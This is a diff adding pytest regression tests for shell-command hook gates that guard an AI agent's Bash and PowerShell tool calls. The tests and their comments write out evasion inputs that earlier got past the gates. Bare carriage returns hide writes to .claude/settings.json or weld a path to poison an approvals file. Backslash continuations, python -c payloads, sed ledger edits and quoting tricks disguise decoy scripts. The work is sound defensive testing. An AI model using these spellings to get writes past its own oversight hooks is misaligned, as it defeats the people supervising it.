@@ -22,6 +22,7 @@ import os
 import pathlib
 import re
 import shutil
+import string
 import subprocess
 import time
 import sys
@@ -5570,6 +5571,346 @@ def test_a_state_path_broken_over_a_line_continuation_is_still_that_path(tmp_pat
     assert "canonical state directory" in result.stderr
 
 
+# WHAT A GATED SHELL DOES WITH EACH CHARACTER OF THE CLASS A LINE BREAK COULD BE SPELLED IN, probed
+# 2026-08-24 against a real `bash.exe` and a real `powershell.exe` with `echo one<CH>echo two` and
+# judged on the RAW bytes by whether the second `echo` ran as a COMMAND. `separates` is the answer
+# for the pair of them: a character ONE of them honours is honoured, because `tool_name` is the
+# caller's choice. The three that merely end a WORD are in the table for the end this rule keeps
+# failing at -- under PowerShell they print `one`, `echo` and `two` on three lines, which reads like
+# two commands from the outside and made the first version of that probe call them separators.
+_BREAK_PROBE = (
+    ("\n", "LF", True),
+    ("\r", "CR", True),
+    ("\t", "tab", False),
+    ("\v", "vertical tab", False),
+    ("\f", "form feed", False),
+    ("\x1c", "file separator", False),
+    ("\x7f", "DEL", False),
+    ("", "NEL", False),
+    (" ", "line separator", False),
+    (" ", "paragraph separator", False),
+)
+
+
+@pytest.mark.parametrize("character,what,separates", _BREAK_PROBE)
+def test_the_shared_preparation_spells_every_statement_break_as_a_newline(
+        character, what, separates):
+    """The preparation every command reader in the kit shares hands on ONE spelling of a break.
+
+    Without that, each reader rewrote the break it happened to know: `gate_write_scope` rewrote
+    `\\n` and nothing else, so a CR stayed ordinary whitespace to `shlex`, the whole line read as
+    one pipeline with the harmless verb in front of it, and a write to `.claude/settings.json`
+    behind a CR was rc 0 in all three kits while PowerShell ran it (`BUG-0066`; the refusal end is
+    `test_a_carriage_return_does_not_hide_a_write_from_the_scope_gate`).
+
+    Both ends are measured here, and the second is the one that keeps the rule from becoming "refuse
+    everything unusual": a character the shells do NOT end a statement at survives untouched.
+    """
+    prepared = _compat.join_line_continuations("echo one%secho two" % character)
+    assert ("\n" in prepared) is separates, "%s: %r" % (what, prepared)
+    assert prepared == ("echo one\necho two" if separates else "echo one%secho two" % character)
+
+
+def test_a_crlf_is_one_statement_break_and_not_two():
+    """The pair is how a Windows editor spells the single break both shells honour there. Rewritten
+    per character it would become two, and an empty statement between them is an artefact every
+    reader downstream then has to know about."""
+    assert _compat.join_line_continuations("echo one\r\necho two") == "echo one\necho two"
+
+
+@pytest.mark.parametrize("continuation", ["\\", "`"])
+def test_a_continuation_is_joined_before_a_break_is_normalised(continuation):
+    """The ORDER of the two rewrites, as a property of the TEXT.
+
+    A continuation followed by a CRLF is joined -- a shell that continues a line over its own escape
+    character does so over the CRLF spelling of the break too. A continuation followed by a BARE CR
+    is not: no gated shell continues there (PowerShell prints `one\\` and `two`, two statements; the
+    Bash rail never receives a bare CR at all). Normalising first would spell that pair
+    `<cont>`+LF, the continuation rule would eat it, and a break the shell honours would be gone.
+
+    WHAT THIS DOES *NOT* CLAIM, because measuring it said otherwise: it does not decide a verdict
+    any more. With the continuation tool-dependent (`_compat._CONTINUATION_BY_TOOL`) and a Bash line
+    carrying a bare CR refused outright (`_kernel._EATEN_IN_FLIGHT`), both orders answer rc 2 on
+    every line that used to separate them, measured against a real gate process. The order is the
+    shell's, and this test pins the text it produces -- not a refusal that depends on it.
+    """
+    joined = _compat.join_line_continuations("echo one%s\r\necho two" % continuation)
+    assert joined == "echo oneecho two"
+    kept = _compat.join_line_continuations("echo one%s\recho two" % continuation)
+    assert kept == "echo one%s\necho two" % continuation
+
+
+@pytest.mark.parametrize("kit", KITS)
+@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
+def test_a_carriage_return_does_not_hide_a_write_from_the_scope_gate(tmp_path, kit, tool):
+    """`BUG-0066`, the refusal end, in every kit and on both tool rails.
+
+    MEASURED END TO END on scaffolded projects outside the repo, all three kits identically: with
+    `tool_name: PowerShell`, `Get-Content README.md<CR>Set-Content -Path .claude/settings.json
+    -Value …` was rc 0 from the whole registered chain, rc 0 from a real `powershell.exe`, and the
+    file the provider reads to learn WHICH hooks run was 31 bytes of poison afterwards -- one call,
+    one session. Both rails are asserted because the tool name is the caller's choice, and a refusal
+    that depended on it would be decided by the attacker.
+    """
+    dispatched_repo(tmp_path)
+    command = ("Get-Content README.md\rSet-Content -Path .claude/settings.json -Value x"
+               if tool == "PowerShell" else "echo hello\rtee .claude/settings.json")
+    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
+    assert run_scope(tmp_path, payload, kit=kit).returncode == 2, repr(command)
+
+
+# Lines whose verdict must not depend on WHICH character spells the break in them: a write behind
+# the break, a verb the break would tear off its own flag, and two plain reads that must stay
+# allowed so the answer to a CR cannot be "refuse every line that carries one".
+_SPELLING_INVARIANT = [
+    ("a write behind the break",
+     "Get-Content README.md%sSet-Content -Path .claude/settings.json -Value x", 2),
+    ("a verb and the flag that makes it a write", "rm%s -rf project_memory/decisions", 2),
+    ("a state path behind the break", "Get-Content x%sechox > project_memory/x.yaml", 2),
+    ("two reads", "git status%sgit diff", 0),
+    ("a read and its own flag", "git log%s --oneline", 0),
+]
+
+
+@pytest.mark.parametrize("what,shape,verdict", _SPELLING_INVARIANT)
+def test_a_carriage_return_is_read_as_the_newline_it_replaces_and_no_more(
+        tmp_path, what, shape, verdict):
+    """The counter direction, and the trap the naive variant walked into one round earlier.
+
+    Adding the CR to the SEPARATOR class instead of rewriting it into the newline cuts between a
+    verb and the flag that makes it a write, because the rules that put a newline back together
+    never see it -- measured in TSK-0083 as `find ledger<CR> -delete && git commit -m x` falling
+    from rc 2 to rc 0. Here the property is stated without naming those rules: whatever the gate
+    answers for a break, it answers for every spelling of it.
+
+    ON THE POWERSHELL RAIL, because that is where a CR IS a spelling of the break. On the Bash rail
+    it is not one -- the tool deletes it before bash parses, so the line bash receives is not the
+    line at all, and the answer there is a refusal rather than a reading
+    (`test_a_line_carrying_a_character_its_shell_never_sees_is_refused`).
+    """
+    dispatched_repo(tmp_path)
+    for spelling in ("\n", "\r", "\r\n"):
+        command = shape % spelling
+        payload = dict(shell_payload(tmp_path, command), tool_name="PowerShell")
+        result = run_scope(tmp_path, payload)
+        assert result.returncode == verdict, "%r: rc %d\n%s" % (
+            command, result.returncode, result.stderr)
+
+
+@pytest.mark.parametrize("kit", KITS)
+@pytest.mark.parametrize("what,tool,command,verdict", [
+    ("a bare CR welding two words into a state path", "Bash",
+     "echo poison > project_mem\\\rory/approvals/APR-0001.yaml", 2),
+    ("a bare CR between two reads", "Bash", "git status\rgit diff", 2),
+    ("a CRLF, whose LF survives the trip", "Bash", "git status\r\ngit diff", 0),
+    ("a plain LF", "Bash", "git status\ngit diff", 0),
+    ("no break at all", "Bash", "git status", 0),
+    ("the same bare CR where the shell DOES receive it", "PowerShell", "git status\rgit diff", 0),
+])
+def test_a_line_carrying_a_character_its_shell_never_sees_is_refused(
+        tmp_path, kit, what, tool, command, verdict):
+    """A gate that reads a different line than the one that runs has inspected nothing.
+
+    MEASURED, by having each gated shell print a string back and comparing the BYTES, over every C0
+    control character, DEL, U+0085, U+2028 and U+2029: exactly one character of that class does not
+    survive: the CARRIAGE RETURN on the `Bash` rail. What that costs is a WELD --
+    `echo poison > project_mem<BS><CR>ory/approvals/APR-0001.yaml` was rc 0 from the whole registered
+    chain, rc 0 from a real bash, and the canonical item read `poison` afterwards. WHO deletes it,
+    and on which platform that holds, is `_kernel._EATEN_IN_FLIGHT`; it is the shell's own input
+    reader rather than the tool, and this test does not restate the measurement.
+
+    THREE COUNTER-ENDS, because a refusal this blunt has to earn its keep: a CRLF is NOT refused
+    (its CR is dropped and the LF stays the break it was, so the gate and the shell agree -- and it
+    is how every Windows editor spells a line end), a plain LF is not, and the SAME bare CR on the
+    PowerShell rail is not, because PowerShell really receives it and really ends a statement there.
+    What the refusal costs was measured over this repo's own corpora and belongs in that round's
+    report, not in a second copy here: no legitimate command line carries a bare CR, and the ones
+    that do are attack forms already asserted as refused.
+
+    The rule lives at the SHARED payload door (`_kernel.payload` -> `_EATEN_IN_FLIGHT`), not in any
+    gate, so a gate added later inherits it by asking that door rather than by remembering — and
+    which gate of the chain speaks is therefore the first one that asks. NOT "every blocking gate
+    goes through it", which is what this said and is measured false: four of the registered shell
+    gates reach the payload another way and at least two of them can block. What makes the refusal
+    hold for the whole CALL anyway is that `gate_write_scope` is registered on the same event in
+    every kit and does ask, and a chain ends at its first refusal.
+    """
+    dispatched_repo(tmp_path)
+    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
+    result = run_scope(tmp_path, payload, kit=kit)
+    assert result.returncode == verdict, "%r: rc %d\n%s" % (
+        command, result.returncode, result.stderr)
+
+
+def _names_a_carriage_return(pattern):
+    """Does this regular expression source name a CARRIAGE RETURN?
+
+    THE PATTERN TEXT is the thing read, and it is the thing that runs — a compiled pattern is that
+    string. Behaviour would be the blunter test and a wrong one: `\\s` matches a CR without being a
+    second copy of the break rule, and `_NEWLINE_AROUND_PIPE_RX` is built out of it.
+
+    WHAT THIS READER DOES NOT READ, named rather than implied, because a check that hides its own
+    blind spot is the one that gets trusted too far: a CR spelled `\\x0d`, `\\015`, `\\N{…}` or
+    `chr(13)`, and a pattern assembled from pieces at run time.
+    """
+    return "\r" in pattern or "\\r" in pattern
+
+
+def _preparation_callers(kit):
+    """The shipped hook modules of `kit` that ask `_compat` for the prepared command text.
+
+    DERIVED from the parsed source rather than listed, because the point of the rule below is the
+    caller nobody has written yet.
+    """
+    hooks = os.path.join(TEAM_KITS, kit, "hooks")
+    callers = []
+    for name in sorted(os.listdir(hooks)):
+        if not name.endswith(".py") or name == "_compat.py":
+            continue
+        with open(os.path.join(hooks, name), encoding="utf-8") as handle:
+            tree = ast.parse(handle.read(), filename=name)
+        for node in ast.walk(tree):
+            if (isinstance(node, ast.Attribute) and node.attr == "join_line_continuations"
+                    and isinstance(node.value, ast.Name) and node.value.id == "_compat"):
+                callers.append(name)
+                break
+    return callers
+
+
+@pytest.mark.parametrize("kit", KITS)
+def test_no_caller_of_the_preparation_keeps_a_second_copy_of_the_break_rule(kit):
+    """A gate that asks for the prepared text must not then prepare it again.
+
+    The half of `BUG-0066` that outlives the fix: the rewrite lives INSIDE the preparation now, so a
+    caller cannot take the join without it -- but a caller may still add its own, and then there are
+    two places for one rule to rot. `gate_ledger_valid` was exactly that, a `\\r\\n?` of its own
+    beside the shared one, which is why this reads the pattern a module COMPILES rather than trusting
+    that nobody will.
+
+    NOT MEASURED HERE, said rather than implied: a module that never asks for the preparation is
+    outside this rule, a copy that is not a compiled pattern is invisible to it, and what counts as
+    naming a carriage return is `_names_a_carriage_return`, which states its own blind spots.
+    """
+    callers = _preparation_callers(kit)
+    assert callers, "no shipped hook in %s asks for the prepared command text" % kit
+    for name in callers:
+        with open(os.path.join(TEAM_KITS, kit, "hooks", name), encoding="utf-8") as handle:
+            tree = ast.parse(handle.read(), filename=name)
+        for node in ast.walk(tree):
+            if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
+                    and node.func.attr == "compile"):
+                continue
+            for argument in node.args[:1]:
+                if isinstance(argument, ast.Constant) and isinstance(argument.value, str):
+                    assert not _names_a_carriage_return(argument.value), "%s/%s compiles %r" % (
+                        kit, name, argument.value)
+
+
+# EVERY WAY THE LINE THAT REACHES THIS TOOL'S SHELL CAN SPELL A STATEMENT BREAK, which is not the
+# same set for the two of them and is measured rather than assumed. PowerShell receives and honours
+# LF, CR and CRLF. The Bash rail has only two, because the tool deletes a bare CR before bash parses
+# and a line carrying one is therefore refused outright rather than read
+# (`test_a_line_carrying_a_character_its_shell_never_sees_is_refused`), while the CR of a CRLF is
+# dropped and the LF behind it stays the break it was.
+_BREAK_SPELLINGS = {
+    "Bash": ("\n", "\r\n"),
+    "PowerShell": ("\n", "\r", "\r\n"),
+}
+
+
+@pytest.mark.parametrize("kit", KITS)
+@pytest.mark.parametrize("tool,shape", [
+    ("Bash", "echo hello%stee .claude/settings.json"),
+    ("PowerShell", "Get-Content README.md%sSet-Content -Path .claude/settings.json -Value x"),
+])
+def test_every_registered_shell_gate_answers_every_spelling_of_a_break_alike(
+        tmp_path, kit, tool, shape):
+    """The tripwire for the gate nobody has written yet: the set of gates is DERIVED from the
+    registration by `_registered_shell_gates`, so a new one joins this rule the day it is
+    registered.
+
+    Each gate is run on its own, so the answer is that gate's and not the chain's, and each spelling
+    is compared against the FIRST one of the same line rather than against a fixed verdict -- what a
+    gate refuses is its own business, that it refuses the same however the break is spelled is not.
+    Which spellings a rail has is `_BREAK_SPELLINGS`, measured.
+
+    WHAT THIS DOES NOT MEASURE, because the claim would otherwise be bigger than the code: a gate
+    that refuses NOTHING in this line is compared as 0 against 0. The line is deliberately one a
+    scaffolded project carries without per-gate fixtures; measured 2026-08-24 as real hook
+    processes against scaffolded projects of all three kits, `gate_write_scope` is the gate it
+    catches, and the gates that answer whole-line questions (`gate_git`, `gate_push_token`,
+    `gate_filing`) were blind to the spelling before this round already.
+    """
+    dispatched_repo(tmp_path)
+    spellings = _BREAK_SPELLINGS[tool]
+    verdicts = {spelling: _shell_verdicts(tmp_path, shape % spelling, kit=kit, tool=tool)
+                for spelling in spellings}
+    for gate, first in verdicts[spellings[0]].items():
+        for spelling in spellings[1:]:
+            assert first == verdicts[spelling][gate], "%s/%s (%s): %r is rc %d, %r is rc %d" % (
+                kit, gate, tool, spellings[0], first, spelling, verdicts[spelling][gate])
+
+
+# WHICH CONTINUATION EACH GATED SHELL REALLY HONOURS, measured 2026-08-24 by asking a real
+# `bash.exe` and a real `powershell.exe` whether `echo one<PAIR>echo two` ran ONE command or two.
+# The line is a write to the file the provider reads to learn which hooks run, so `refused` is the
+# answer wherever the named shell would run the second statement, and `allowed` wherever it really
+# continues the line -- and each `allowed` row is measured against the shell itself as well, with a
+# file witness: the shell must then write nothing.
+_CONTINUATION_TRUTH = [
+    ("Bash", "backslash + LF", "\\\n", 0),
+    ("Bash", "backslash + CRLF", "\\\r\n", 0),
+    ("Bash", "backtick + LF", "`\n", 2),
+    ("Bash", "backtick + CRLF", "`\r\n", 2),
+    ("PowerShell", "backslash + LF", "\\\n", 2),
+    ("PowerShell", "backslash + CRLF", "\\\r\n", 2),
+    ("PowerShell", "backtick + LF", "`\n", 0),
+    ("PowerShell", "backtick + CRLF", "`\r\n", 2),
+]
+
+
+@pytest.mark.parametrize("kit", KITS)
+@pytest.mark.parametrize("tool,what,pair,verdict", _CONTINUATION_TRUTH)
+def test_a_continuation_the_named_shell_does_not_honour_is_not_joined(
+        tmp_path, kit, tool, what, pair, verdict):
+    """A break the gate removes as a continuation is a break the gate cannot see.
+
+    The union of both escape characters was one rule for two shells that disagree, and it removed a
+    break the NAMED shell honours. Measured with a file witness in the dev and office kits, before
+    this round: with `tool_name: PowerShell`, `Get-Content README.md <BS><LF>Set-Content -Path
+    .claude/settings.json -Value POISONED` was gate rc 0, `powershell.exe` rc 0 and the file
+    overwritten; `<BS><CRLF>` the same. PowerShell continues a line over a BACKTICK, not over a
+    backslash.
+
+    BOTH DIRECTIONS ARE IN THE TABLE, which is what keeps this from being "refuse anything with a
+    backslash in it": each shell's OWN continuation stays allowed, and every allowed row was
+    measured against the real shell too -- bash runs `echo hello tee .claude/settings.json` as one
+    command and writes nothing, PowerShell answers rc 1 and writes nothing.
+    """
+    dispatched_repo(tmp_path)
+    write = ("Set-Content -Path .claude/settings.json -Value x" if tool == "PowerShell"
+             else "tee .claude/settings.json")
+    command = ("Get-Content README.md " if tool == "PowerShell" else "echo hello ") + pair + write
+    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
+    result = run_scope(tmp_path, payload, kit=kit)
+    assert result.returncode == verdict, "%s %r: rc %d\n%s" % (
+        tool, command, result.returncode, result.stderr)
+
+
+def test_every_gated_shell_tool_has_its_own_continuation_rule():
+    """Both ends of the one table in this layer that IS an enumeration.
+
+    The tools a kit gates are `SHELL_TOOLS`, read off a shipped gate rather than repeated here. An
+    entry missing from `_CONTINUATION_BY_TOOL` falls back to the union of both escape characters,
+    which is the defect this table exists for; an entry that is in it and NOT gated is a rule
+    nothing reaches. Neither end is visible in any behaviour test, because a tool nobody gates
+    produces no measurement.
+    """
+    scope = load_hook_module("gate_write_scope")
+    assert set(_compat._CONTINUATION_BY_TOOL) == set(scope.SHELL_TOOLS), (
+        sorted(_compat._CONTINUATION_BY_TOOL), sorted(scope.SHELL_TOOLS))
+
+
 def test_a_commit_message_with_a_write_verb_is_still_prose(tmp_path):
     """The counterpart that gives the raw/prose-stripped split its meaning: the earlier version of
     this test had no write verb before the path, so it passed with the split removed."""
@@ -5809,15 +6150,19 @@ def test_a_heredoc_body_is_prose(tmp_path):
     assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0
 
 
-def _shell_verdicts(tmp_path, command, kit="dev-team"):
+def _shell_verdicts(tmp_path, command, kit="dev-team", tool="Bash"):
     """{gate name: exit code} for every REGISTERED shell gate, each a real process.
 
     The registration is read by `_registered_shell_gates` above — one reader for the whole file,
     because "which gates does a shell call pass" is a question for settings.json and a second
     reader of it is the drift this repo keeps paying for.
+
+    `tool` because both shell tools go through the same registration and the two disagree about
+    what a command line means; a caller that must ask the question on the other rail should not
+    have to grow a second runner for it.
     """
     env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
-    payload = json.dumps(shell_payload(tmp_path, command))
+    payload = json.dumps(dict(shell_payload(tmp_path, command), tool_name=tool))
     gates = _registered_shell_gates(kit)
     assert len(gates) >= 5, gates
     return {name: subprocess.run(
@@ -9364,13 +9709,33 @@ _PROSE_ABOUT_THE_LEDGER = (
      '--status-proposal FAILED --summary "ledger_add.py refused: 1,75 * 1,19 = 2,08 != 2,10"'),
     # ...and the same line with an INTERPRETER OPTION in front of the script. `-B` is what a
     # session that must not leave bytecode behind types, and the option class it fell outside of
-    # was a list of letters; `-E` is in that list and is here as its control.
+    # was a list of letters.
     ("the entry point behind an interpreter option",
      "python -B scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
     ("the entry point behind an option cluster",
      "python -Bu scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
+    # `-E` is the CASE control of that class, and until this round only a comment said so: `-E` is
+    # an ordinary option, `-e` is a payload flag, and an option class that folded the two would
+    # refuse this line. It is what keeps `test_the_two_readers_of_an_inline_payload_option_agree`
+    # honest about comparing letters rather than case.
+    ("the entry point behind an upper-case option that differs from a payload flag only in case",
+     "python -E scripts/harness.py submit-result --summary 'booked via ledger_add.py'"),
     ("the validator's own validate run behind an interpreter option",
      "python -B scripts/ledger_add.py --validate ledger/2026.csv"),
+    # ...and the same shape whose ARGUMENT PROSE happens to spell an interpreter payload flag.
+    # `BUG-0063`: both exemptions ended in a lookahead that scanned the whole tail for a
+    # `-c`/`-e`/`-m` word, so writing about the `-m` flag put the P4-12 refusal back. The letters
+    # are derived rather than typed in
+    # `test_an_option_word_after_the_script_is_an_argument_not_a_payload`; this entry is the line
+    # the bug was measured on, kept verbatim beside its counter-cases.
+    ("the entry point whose summary talks about a flag",
+     'python scripts/harness.py evidence --summary "fixed the -m flag handling in '
+     'scripts/ledger_add.py"'),
+    # ...and the price of vouching for the VALIDATOR's stage the way the entry point's is vouched
+    # for: the words in its own arguments stop being read as commands. Pinned as an ALLOW so the
+    # widening is measured rather than silent; its counter-cases are in the table below.
+    ("the validator's own run, whose note names the folder it lives in",
+     'python scripts/ledger_add.py add --note "cp backup.py scripts/"'),
 )
 _WORK_ON_THE_LEDGER = (
     ("a shell that EXECUTES its here-document body",
@@ -9391,6 +9756,31 @@ _WORK_ON_THE_LEDGER = (
     # ...and a decoy validator behind the same interpreter option the exemption now steps over.
     ("a decoy validator behind an interpreter option, then a commit",
      "python -B tools/ledger_add.py && git commit -m x"),
+    # THE SAME STAGE-VERSUS-SEGMENT PROPERTY, asked of the VALIDATOR's exemption. It kept the
+    # whole-segment shape one round after the entry point's was narrowed, and a segment holds a
+    # whole pipeline -- so the neighbour rode along free. Measured exit 0 on the shipped hook
+    # before TSK-0083; the inline-payload sibling is here because it was refused only by the
+    # trailing lookahead that BUG-0063 removed.
+    ("a write in the stage after the validator",
+     "python scripts/ledger_add.py --validate ledger/2026.csv | "
+     "sed -i s/119.00/150.00/ ledger/2026.csv && git commit -m x"),
+    ("an inline payload in the stage after the validator",
+     "python scripts/ledger_add.py --validate ledger/2026.csv | "
+     "python -c \"open('ledger/2026.csv','w')\" && git commit -m x"),
+    # ...and the counter-half of the allow directly above: the same words, in a stage of their own,
+    # are a command again -- both as a pipeline neighbour and as a separate segment.
+    ("a copy into the validator's folder after the validator",
+     "python scripts/ledger_add.py --validate ledger/2026.csv | xargs -I{} cp {} scripts/ "
+     "&& git commit -m x"),
+    ("a copy into the validator's folder beside the validator run",
+     "python scripts/ledger_add.py --validate ledger/2026.csv ; cp backup.py scripts/ "
+     "&& git commit -m x"),
+    # ...and the inline payload with no script argument at all, which is `_INLINE_CODE_RX`'s own
+    # direction. It used to be the counter-test for `_INTERPRETER_OPTIONS` as well, which it never
+    # measured (`test_a_real_interpreter_payload_before_the_script_is_still_refused`); it belongs
+    # here, where the shape is the claim.
+    ("an inline payload writing the validator",
+     "python -c \"open('scripts/ledger_add.py','w').write('')\" && git commit -m x"),
 )
 
 
@@ -9424,6 +9814,1161 @@ def test_the_same_constructs_still_refuse_a_real_write(tmp_path, what, command):
     """
     ledger_repo(tmp_path)
     assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what
+
+
+def _letters_by_option_position(gate):
+    """Letters `_INTERPRETER_OPTIONS` will not step over on the way to a script argument.
+
+    Case-folded, like its sibling below, because the two readers differ in case ON PURPOSE and
+    that difference is not the thing being compared — see
+    `test_the_two_readers_of_an_inline_payload_option_agree`."""
+    return {letter.lower() for letter in string.ascii_letters
+            if not gate._ENTRY_POINT_RUN_RX.search(
+                "python -%s scripts/harness.py doctor" % letter)}
+
+
+def _letters_by_inline_reader(gate):
+    """The same set as the OTHER reader in the module spells it — `_INLINE_CODE_RX`, which decides
+    whether `handle_pre_tool_use` keeps an interpreter line unstripped."""
+    return {letter.lower() for letter in string.ascii_letters
+            if gate._INLINE_CODE_RX.search("python -%s payload" % letter)}
+
+
+def _inline_payload_option_letters():
+    """The single-letter interpreter options that make the interpreter read its program from the
+    COMMAND LINE, taken as the UNION of the module's two independent spellings of that set.
+
+    Deriving the parametrisation from the one pattern a test checks is a test that cannot fail:
+    when the letter falls out of the pattern, its case falls out of the run with it. Measured —
+    mutating `_INTERPRETER_OPTIONS` from `[cem]` to `[cm]` left the whole ledger selection green
+    while `python -e scripts/harness.py … && git commit` went to exit 0. The union keeps the case
+    alive as long as EITHER reader still knows the letter, and
+    `test_the_two_readers_of_an_inline_payload_option_agree` is the tripwire on the two drifting
+    apart at all. What neither construction can see is both readers losing the same letter in one
+    change; that is the residual, and it is not claimed away here.
+    """
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    letters = sorted(_letters_by_option_position(gate) | _letters_by_inline_reader(gate))
+    assert letters, ("neither reader treats any option letter as an inline payload any more — the "
+                     "tests below would be parametrised over nothing and could not fail")
+    return letters
+
+
+def test_the_two_readers_of_an_inline_payload_option_agree():
+    """The gate says "this option carries the program inline" in two places — the option class the
+    exemptions step over, and the reader that decides whether an interpreter line keeps its script
+    path. They must mean the same LETTERS: if the option class forgets one, the exemption steps
+    over a real payload, and no case built from that same class would notice.
+
+    Letters, not case, and that is a measured distinction rather than a convenience: the option
+    class is deliberately case-SENSITIVE (`-E` is an option, `-e` is a payload flag) while the
+    inline reader is `re.IGNORECASE` and therefore also answers yes to `-E`. That over-match costs
+    nothing — it only keeps an interpreter line unstripped, the conservative direction — and the
+    distinction the option class makes is pinned separately, by the `-E` entry of
+    `_PROSE_ABOUT_THE_LEDGER` (`test_prose_about_the_ledger_in_a_body_or_an_argument_is_not_a_write`),
+    which goes red the moment `_INTERPRETER_OPTIONS` starts folding case."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    by_position = _letters_by_option_position(gate)
+    by_reader = _letters_by_inline_reader(gate)
+    assert by_position == by_reader, (
+        "_INTERPRETER_OPTIONS and _INLINE_CODE_RX disagree about which option carries an inline "
+        "payload: only the option class knows %s, only the inline reader knows %s"
+        % (sorted(by_position - by_reader) or "nothing",
+           sorted(by_reader - by_position) or "nothing"))
+
+
+@pytest.mark.parametrize("letter", _inline_payload_option_letters())
+def test_an_option_word_after_the_script_is_an_argument_not_a_payload(tmp_path, letter):
+    """BUG-0063: an interpreter reads a payload only while it is still reading OPTIONS, so the
+    position decides, not the letters. Both exemptions used to end in a lookahead over the whole
+    tail, and honest argument prose (`--summary "fixed the -m flag handling in
+    scripts/ledger_add.py"`) therefore lost the exemption P4-12 was built for — measured exit 2
+    against the shipped hook. After the script name those letters belong to the script's own
+    parser."""
+    ledger_repo(tmp_path)
+    command = ('python scripts/harness.py evidence --summary '
+               '"fixed the -%s flag handling in scripts/ledger_add.py" && git commit -m x' % letter)
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == 0, "-%s in argument prose was refused:\n%s" % (
+        letter, result.stderr)
+
+
+# The two canonical invocations, each with the tail that makes the line reach this gate at all.
+_VOUCHED_INVOCATIONS = (
+    ("the entry point", "scripts/harness.py",
+     "evidence --summary \"booked via scripts/ledger_add.py\""),
+    ("the validator", "scripts/ledger_add.py", "--validate ledger/2026.csv"),
+)
+# ...the same two, addressed by the PATH they are anchored to. Derived, so a third guarded program
+# arrives in every test below the day it is added to the table above.
+_VOUCHED_INVOCATIONS_BY_PATH = tuple((script, tail) for _w, script, tail in _VOUCHED_INVOCATIONS)
+
+
+@pytest.mark.parametrize("what,script,tail", _VOUCHED_INVOCATIONS)
+@pytest.mark.parametrize("letter", _inline_payload_option_letters())
+def test_a_real_interpreter_payload_before_the_script_is_still_refused(
+        tmp_path, letter, what, script, tail):
+    """The counter-half, IN THE POSITION THE CLAIM IS ABOUT: the payload option stands between the
+    interpreter and the script, which is the only place it can, and the exemption must not step
+    over it.
+
+    The first cut of this test ran `python -<letter> "open(…)"` with no script argument at all.
+    That line is refused by `_INLINE_CODE_RX` alone, so it stayed green while
+    `_INTERPRETER_OPTIONS` — the pattern the comment beside it credits — was mutated from `[cem]`
+    to `[cm]` and `python -e scripts/harness.py … && git commit` went to exit 0. A counter-test
+    that passes for a different reason than the one it names is a claim, not a measurement."""
+    ledger_repo(tmp_path)
+    command = "python -%s %s %s && git commit -m x" % (letter, script, tail)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, "%s / -%s" % (
+        what, letter)
+
+
+# HOW THE SAME FILE NAME CAN BE SPELLED, which is what a shell resolves and this gate has to
+# resolve with it. Parametrised over the QUOTING rather than over suffixes: the first cut of these
+# tests listed `.bak`, `-evil`, `.pyc`, and a list of suffixes is a claim about which neighbours
+# exist.
+#
+# QUOTING CAN FALL ANYWHERE IN THE WORD, and the templates used to put it only around the WHOLE
+# word — while the defect the docstring below quotes is `scripts/ledger_add.py'.bak'`, quoting
+# around the SUFFIX. Ten generated cases, none of them the measured one. So the spellings are
+# generated from the word instead of listed: whole-word quoting, an empty span at either end, and
+# the same three applied to the word SPLIT at its last dot, which is where a suffix begins.
+def _quoting_spellings(word):
+    """(what, spelling) for every way quoting can hide a word boundary inside `word`."""
+    head, dot, tail = word.rpartition(".")
+    split = [("the suffix in single quotes", "%s.'%s'" % (head, tail)),
+             ("the suffix in double quotes", '%s."%s"' % (head, tail)),
+             ("an empty span before the suffix", "%s''.%s" % (head, tail)),
+             ("the dot itself quoted", "%s'.'%s" % (head, tail))] if dot else []
+    return [("plain", word),
+            ("wrapped in double quotes", '"%s"' % word),
+            ("wrapped in single quotes", "'%s'" % word),
+            ("an empty quoted span glued to the end", "%s''" % word),
+            ("an empty quoted span glued to the front", "''%s" % word)] + split
+
+
+_QUOTING_SPELLINGS = tuple(what for what, _s in _quoting_spellings("a.b"))
+
+
+@pytest.mark.parametrize("what", _QUOTING_SPELLINGS)
+@pytest.mark.parametrize("canonical,tail", _VOUCHED_INVOCATIONS_BY_PATH)
+def test_quoting_inside_a_word_does_not_change_which_file_it_names(
+        tmp_path, canonical, tail, what):
+    """Both halves of the same property, because quoting hides a word boundary in both directions.
+
+    A SIBLING first: the anchor used to end on `\\b`, which the `.` of `.bak` satisfies, so
+    `python scripts/ledger_add.py.bak …` was vouched for as the guarded program. Narrowing the
+    anchor to `(?![\\w.-])` fixed the bare spelling and not the quoted one — a shell removes quote
+    marks character by character and the gate did not, so `scripts/ledger_add.py'.bak'` walked
+    straight back in (measured through the registered chain, exit 0). A character class cannot
+    answer where a word ends; quote removal can, and `_quoting_resolved` is where it happens.
+
+    THE CANONICAL path second, in the same spellings: it must keep its exemption however it is
+    quoted, or the fix would have bought refusals for the remedy. `python "scripts/ledger_add.py"
+    --validate …` was refused as a stranger before that view existed."""
+    ledger_repo(tmp_path)
+    sibling = dict(_quoting_spellings(canonical + ".bak"))[what]
+    command = "python %s %s && git commit -m x" % (sibling, tail)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, "sibling/%s" % what
+    same = dict(_quoting_spellings(canonical))[what]
+    command = "python %s %s && git commit -m x" % (same, tail)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, "canonical/%s" % what
+
+
+@pytest.mark.parametrize("what", _QUOTING_SPELLINGS)
+def test_quoting_does_not_hide_a_decoy_validator(tmp_path, what):
+    """The other side of the same view: `python tools/ledger_add".py" && git commit` escaped the
+    decoy rule for the same reason the sibling escaped the anchor — the quote marks stood inside
+    the word and only the shell removed them."""
+    ledger_repo(tmp_path)
